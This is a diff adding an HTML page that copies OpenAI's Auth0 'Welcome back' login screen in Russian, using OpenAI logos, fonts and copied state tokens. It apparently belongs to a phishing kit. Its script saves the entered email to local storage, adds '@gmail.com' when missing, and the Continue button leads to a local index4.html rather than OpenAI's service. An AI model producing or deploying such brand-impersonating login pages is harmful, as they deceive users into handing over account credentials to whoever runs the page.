@@ -1,0 +1,463 @@
+<html data-lt-installed="true"><head>    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+      <meta name="ulp-version" content="1.17.66">
+    
+    <title>Вход</title>
+    
+    <meta name="robots" content="noindex, nofollow">
+    
+    <link rel="shortcut icon" href="img/logo1.png">
+    <link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.84.5/css/main.cdn.min.css">
+    <style id="custom-styles-container">
+      
+        
+
+body {
+  background: #ffffff;
+  font-family: ulp-font, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, sans-serif;
+}
+.c65b66da6 {
+  background: #806491;
+}
+.cee8b6d5e.cd4adaa36 {
+  background: #D00E17;
+}
+.cee8b6d5e.cc2459151 {
+  background: #806491;
+}
+.c5faccce1 {
+  background-color: #806491;
+  color: #ffffff;
+}
+.c5faccce1 a,
+.c5faccce1 a:visited {
+  color: #ffffff;
+}
+.c5556edd0 {
+  background-color: #806491;
+}
+.ce70c634b {
+  background-color: #D00E17;
+}
+@supports (mask-image: url('/static/img/branding-generic/copy-icon.svg')) {
+  @supports not (-ms-ime-align: auto) {
+    .c8f212026.c838ec48b::before {
+      background-color: #D00E17;
+    }
+  }
+}
+.input.c266d80ea {
+  border-color: #D00E17;
+}
+.error-cloud {
+  background-color: #D00E17;
+}
+.error-fatal {
+  background-color: #D00E17;
+}
+.error-local {
+  background-color: #D00E17;
+}
+#alert-trigger {
+  background-color: #D00E17;
+}
+      
+    </style>
+    <style>
+    /* By default, hide features for javascript-disabled browsing */
+    /* We use !important to override any css with higher specificity */
+    /* It is also overriden by the styles in <noscript> in the header file */
+    .no-js {
+      clip: rect(0 0 0 0);
+      clip-path: inset(50%);
+      height: 1px;
+      overflow: hidden;
+      position: absolute;
+      white-space: nowrap;
+      width: 1px;
+    }
+  </style>
+  <noscript>
+    <style>
+      /* We use !important to override the default for js enabled */
+      /* If the display should be other than block, it should be defined specifically here */
+      .js-required { display: none !important; }
+      .no-js {
+        clip: auto;
+        clip-path: none;
+        height: auto;
+        overflow: auto;
+        position: static;
+        white-space: normal;
+        width: var(--prompt-width);
+      }
+    </style>
+  </noscript>
+    
+<style>
+      @font-face {
+          font-family: "Söhne";
+          src: url("https://cdn.openai.com/common/fonts/soehne/soehne-buch.woff2")
+              format("woff2");
+          font-style: normal;
+          font-weight: 400;
+          font-display: swap;
+      }
+      @font-face {
+          font-family: "Söhne";
+          src: url("https://cdn.openai.com/common/fonts/soehne/soehne-buch-kursiv.woff2")
+              format("woff2");
+          font-style: italic;
+          font-weight: 400;
+          font-display: swap;
+      }
+      @font-face {
+          font-family: "Söhne";
+          src: url("https://cdn.openai.com/common/fonts/soehne/soehne-halbfett.woff2")
+              format("woff2");
+          font-style: normal;
+          font-weight: 700;
+          font-display: swap;
+      }
+      @font-face {
+          font-family: "Söhne";
+          src: url("https://cdn.openai.com/common/fonts/soehne/soehne-halbfett-kursiv.woff2")
+              format("woff2");
+          font-style: italic;
+          font-weight: 700;
+          font-display: swap;
+      }
+
+      :root {
+          --font-family: "Söhne",-apple-system,BlinkMacSystemFont,Helvetica,sans-serif;
+          --primary-color: #806491;
+          --primary-color-no-override:#806491;
+          --action-primary-color: #806491;
+          --link-color: #806491;
+          --input-box-shadow-depth: 1px;
+          --input-border-radius: 6px;
+          --button-border-radius: 6px;
+          --page-background-color: #ffffff;
+      }
+
+      body {
+          font-family: var(--font-family);
+          background-color: var(--page-background-color);
+      }
+
+      .oai-wrapper {
+          display: flex;
+          flex-direction: column;
+          justify-content: space-between;
+          min-height: 100%;
+      }
+
+      .oai-header {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 32px 0 0;
+          flex: 0 0 auto;
+      }
+      .oai-header svg {
+          width: 32px;
+          height: 32px;
+          fill: #202123;
+      }
+
+      .oai-footer {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: #6e6e80;
+          padding: 12px 0 24px;
+          flex: 0 0 auto;
+      }
+      .oai-footer a {
+          color: var(--primary-color);
+          margin: 0 10px;
+      }
+
+      ._widget-auto-layout main._widget {
+          flex: 1 0 auto;
+          min-height: 0;
+      }
+
+      main header > img:first-of-type {
+          display: none;
+      }
+      main > section, main > section > div:first-child {
+          box-shadow: none;
+      }
+      main header > h1 {
+          font-weight: bold !important;
+          font-size: 32px !important;
+      }
+      main a {
+          font-weight: normal !important;
+      }
+      .ulp-alternate-action {
+          text-align: center;
+      }
+      button[type="submit"] {
+          font-family: var(--font-family);
+      }
+
+      
+
+      
+          main header > h1 {
+              margin-bottom: 0 !important;
+          }
+      
+      
+          main header > h1 + div {
+              display: none !important;
+          }
+      
+      
+      
+          div:has(> form[data-provider]) {
+              display: flex;
+              flex-direction: column;
+          }
+          form[data-provider="google"] {
+              order: -1;
+          }
+          form[data-provider] {
+              margin-bottom: var(--spacing-1);
+          }
+      
+    </style>
+  </head>
+  <body class="_widget-auto-layout">
+    <div class="oai-wrapper">
+      <header class="oai-header">
+        
+         
+      </header><main class="_widget login-id">
+  <section class="cd3b6a14d _prompt-box-outer c29f1d46e">
+    <div class="c03b35b7e c1ab0b75a">
+      
+    
+      
+    
+      <div class="c79b2e0a7">
+        <header class="c2486638f c4738ad32">
+          <div title="OpenAI" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important"></div>
+        
+          <img class="c8c467c81 c728b225e" id="prompt-logo-center" src="https://cdn.openai.com/API/images/openai-logomark.png" alt="OpenAI">
+        
+          
+            <h1 class="cec9a2f61 c7a7a5b24">Welcome back</h1>
+          
+        
+          <div class="ca86dd81d cb92cda89">
+            <p class="cdf38eeeb cbd26c9fb">Войти в систему Metro Boomin, чтобы перейти к Apps Client.</p>
+          </div>
+        </header>
+      
+        <div class="cd0d8c8b2 ca80280f0">
+          
+        
+          
+            <div class="cf94b423e cbcfc411a">
+              <div class="c2e75cb77">
+                
+              
+                <form method="POST" class="c9baf35ca _form-login-id" data-form-primary="true">
+                  <input type="hidden" name="state" value="hKFo2SB5anMyY0xETDZVVVRtanJvLUtJRXVTem1YZEJnZFVKN6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNfNWZza2RybnFRT3gxMll1VVdPQWNCSW1rRklrdXRCo2NpZNkgVGRKSWNiZTE2V29USHROOTVueXl3aDVFNHlPbzZJdEc">
+                
+                  
+                
+                  
+                
+                  <div class="cf94b423e cbcfc411a">
+                    <div class="c2e75cb77">
+                      
+                    
+                      
+                        <div class="input-wrapper _input-wrapper">
+                          <div class="c8f212026 c1872bf7b text cd876d1a9 cfa6ca138 c6055cd8b" data-action-text="" data-alternate-action-text="">
+                            <label class="c36c5c842 no-js c4aba456d ca372547c" for="username">
+                              Адрес электронной почты
+                            </label>
+                          
+                            <input class="input c1a815477 cdb4dcfa9" inputmode="email" name="username" id="username" type="text" value="" required="" autocomplete="username" autocapitalize="none" spellcheck="false" autofocus="">
+                          
+                            <div class="c36c5c842 js-required c4aba456d ca372547c" data-dynamic-label-for="username" aria-hidden="true">
+                              Адрес электронной почты
+                            </div>
+                          </div>
+                        
+                          
+                        </div>
+                      
+                    
+                      
+                    
+                      
+                    </div>
+                  </div>
+                
+                  
+                
+                  <input class="hide" type="password" autocomplete="off" tabindex="-1" aria-hidden="true">
+                
+                  <input type="hidden" id="js-available" name="js-available" value="true">
+                
+                  <input type="hidden" id="webauthn-available" name="webauthn-available" value="true">
+                
+                  <input type="hidden" id="is-brave" name="is-brave" value="false">
+                
+                  <input type="hidden" id="webauthn-platform-available" name="webauthn-platform-available" value="true">
+                
+                  
+                
+                  <div class="cff0ff2c6">
+                    
+                      <button type="submit" name="action" value="default" class="cf4ff3b5d c5faccce1 cfccd0b2a c901653c3 _button-login-id" data-action-button-primary="true"><a href="index4.html">Продолжить</a></button>
+                    
+                  </div>
+                </form>
+              </div>
+            </div>
+          
+        
+          
+            <div class="ulp-alternate-action  _alternate-action __s16nu9">
+              
+            
+              <p class="cdf38eeeb cbd26c9fb c78aac1f2">У вас нет учетной записи?
+                <a class="c4a8e5b56 c5abe3637" href="index2.html" aria-label="">Зарегистрироваться</a>
+              </p>
+            
+              
+            </div>
+          
+        
+          
+            <div class="c9421d7d9 c0e56cc4b">
+              <span>Или</span>
+            </div>
+          
+        
+          
+        
+          
+            
+          
+            <div class="cdab2a638 c5bbd8793">
+              
+            
+              
+                <form method="post" data-provider="windowslive" class="c10732c77 c952067d0 cf8071588" data-form-secondary="true">
+                  <input type="hidden" name="state" value="hKFo2SB5anMyY0xETDZVVVRtanJvLUtJRXVTem1YZEJnZFVKN6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNfNWZza2RybnFRT3gxMll1VVdPQWNCSW1rRklrdXRCo2NpZNkgVGRKSWNiZTE2V29USHROOTVueXl3aDVFNHlPbzZJdEc">
+                
+                  <input type="hidden" name="connection" value="windowslive">
+                
+                  <button id="mybutton1" type="submit" class="c2694b5b5 cf417db7d c7a466add" data-provider="windowslive" data-action-button-secondary="true">
+                    
+                      <span class="c57b0b448 c31e7b060" data-provider="windowslive"></span>
+                    
+                  
+                    <a href="https://account.microsoft.com/account" class="c18355931">Продолжить с Microsoft Account</a>
+                  </button>
+                </form>
+              
+                <form method="post" data-provider="google" class="c10732c77 c952067d0 ce7d9fc4c" data-form-secondary="true">
+                  <input type="hidden" name="state" value="hKFo2SB5anMyY0xETDZVVVRtanJvLUtJRXVTem1YZEJnZFVKN6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNfNWZza2RybnFRT3gxMll1VVdPQWNCSW1rRklrdXRCo2NpZNkgVGRKSWNiZTE2V29USHROOTVueXl3aDVFNHlPbzZJdEc">
+                
+                  <input type="hidden" name="connection" value="google-oauth2">
+                
+                  <button type="submit" class="c2694b5b5 cf417db7d c385f7bb4" data-provider="google" data-action-button-secondary="true">
+                    
+                      <span class="c57b0b448 c31e7b060" data-provider="google"></span>
+                    
+                  
+                    <a href="https://accounts.google.com/InteractiveLogin/signinchooser?elo=1&ifkv=ASKXGp1ovNSSXyssrsygEtK36dMsAFtYgwtB1m1Z8ff744QbuGuU9oDX-cQb4SCjTBst8bgW3JBnlw&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin" class="c18355931">Продолжить с Google</a>
+                  </button>
+                </form>
+              
+                <form method="post" data-provider="apple" class="c10732c77 c952067d0 c2861bb0a" data-form-secondary="true">
+                  <input type="hidden" name="state" value="hKFo2SB5anMyY0xETDZVVVRtanJvLUtJRXVTem1YZEJnZFVKN6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNfNWZza2RybnFRT3gxMll1VVdPQWNCSW1rRklrdXRCo2NpZNkgVGRKSWNiZTE2V29USHROOTVueXl3aDVFNHlPbzZJdEc">
+                
+                  <input type="hidden" name="connection" value="apple">
+                
+                  <button type="submit" class="c2694b5b5 cf417db7d c3f521425" data-provider="apple" data-action-button-secondary="true">
+                    
+                      <span class="c57b0b448 c31e7b060" data-provider="apple"></span>
+                    
+                  
+                    <a href="https://appleid.apple.com/" class="c18355931">Продолжить с Apple</a>
+                  </button>
+                </form>
+              
+            
+              
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  
+    
+  </section>
+</main>
+<script type="text/javascript" async="" src="https://chat.openai.com/ces/v1/auth.js"></script><script id="client-scripts">
+
+</script>
+<footer class="oai-footer">
+        <a href="https://openai.com/policies/terms-of-use" target="_blank">Terms of use</a>
+        |
+        <a href="https://openai.com/policies/privacy-policy" target="_blank">Privacy policy</a>
+      </footer>
+    </div>
+
+   
+    <script>
+  // Check if the username exists in local storage
+  const storedUsername = localStorage.getItem('username');
+
+  // If it exists, set the value of the input field
+  if (storedUsername) {
+    document.getElementById('username').value = storedUsername;
+  }
+
+  // Add an event listener to the form submission
+  document.querySelector('form._form-login-id').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    // Get the entered username from the input field
+    const enteredUsername = document.getElementById('username').value;
+
+    // Check if the entered username contains '@gmail.com'
+    if (!enteredUsername.includes('@gmail.com')) {
+      // Append '@gmail.com' to the username
+      const correctedUsername = enteredUsername + '@gmail.com';
+
+      // Update the input field with the corrected username
+      document.getElementById('username').value = correctedUsername;
+
+      // Save the corrected username to local storage
+      localStorage.setItem('username', correctedUsername);
+    } else {
+      // Save the entered username to local storage
+      localStorage.setItem('username', enteredUsername);
+    }
+
+    // Proceed with the form submission (you may want to add additional logic here)
+    this.submit();
+  });
+</script>
+
+        
+    
+   
+  
+
+
+</body>
+</html>
